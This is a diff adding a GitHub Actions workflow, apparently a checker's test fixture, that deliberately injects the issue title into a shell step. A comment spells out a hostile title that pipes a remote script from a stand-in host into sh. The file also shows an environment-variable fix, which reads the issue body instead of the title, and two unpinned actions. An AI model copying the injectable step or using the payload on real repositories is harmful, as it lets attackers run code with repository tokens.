@@ -1,0 +1,51 @@
+# A workflow with a script injection in it, on purpose.
+#
+# This file is an EXAMPLE and a TEST FIXTURE. The checker's tests point at it and assert on what they find, so
+# the vulnerability is a claim this repository verifies rather than a paragraph.
+#
+# Do not copy this file. Copy the comments.
+
+name: Greet a new issue
+
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Say hello
+        # THE BUG. The title is interpolated into the script before the shell sees it, so the shell receives
+        # whatever the issue author typed. An issue called
+        #
+        #   "; curl -s https://example.com/x.sh | sh; #
+        #
+        # runs that script with the repository's token.
+        #
+        # It is not a quoting problem. Adding quotes moves the metacharacter the attacker needs, it does not
+        # remove one: the expression is substituted as text before quoting is evaluated.
+        #
+        # A YAML aside, because this file found it: `run: echo "New issue: ${{ ... }}"` on one line does not
+        # parse. The value is a PLAIN scalar, so YAML reads `echo "New issue` as a key when it reaches the
+        # `: ` inside the quotes. The double quotes are part of the shell command, not part of the YAML, and
+        # YAML does not know that. A block scalar removes the ambiguity, which is why nearly every real `run:`
+        # is written with a pipe.
+        run: |
+          echo "New issue: ${{ github.event.issue.title }}"
+
+      - name: Say hello, safely
+        # THE FIX. The value goes into the environment, which is not parsed as shell, and the script reads a
+        # variable. The quotes around "$TITLE" matter for word splitting and nothing else, because the value
+        # never reaches the parser as source text.
+        env:
+          TITLE: ${{ github.event.issue.body }}
+        run: |
+          echo "New issue: $TITLE"
+
+      - name: An action with no version
+        uses: some-org/some-action
+
+      - name: An action on a mutable tag
+        uses: some-org/other-action@v1
